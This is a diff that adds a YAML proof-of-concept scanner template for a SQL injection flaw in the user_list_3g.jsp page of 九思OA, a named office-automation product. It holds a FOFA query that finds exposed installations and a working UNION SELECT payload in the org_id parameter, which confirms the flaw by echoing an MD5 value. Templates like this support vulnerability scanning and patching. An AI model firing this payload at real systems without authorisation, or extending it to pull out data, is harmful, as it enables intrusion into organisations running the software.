@@ -1,0 +1,20 @@
+id: poc-yaml-jiusi-oa-user-list-3g-sqli
+info:
+  name: 九思OA user_list_3g.jsp SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 九思OA
+  fofa: app="九思软件-OA"
+variables:
+  t1: random_int(1000,9999)
+  result: md5(t1)
+requests:
+- method: GET
+  path: /jsoa/wap2/personalMessage/user_list_3g.jsp?org_id=0%20%20union/**/select/**/1,md5({{.t1}})%20%23&userIds=1&userNames=1&content=1
+  expression: 'status_code == 200 &&
+
+    contains(body,result)
+
+    '
+transport: http
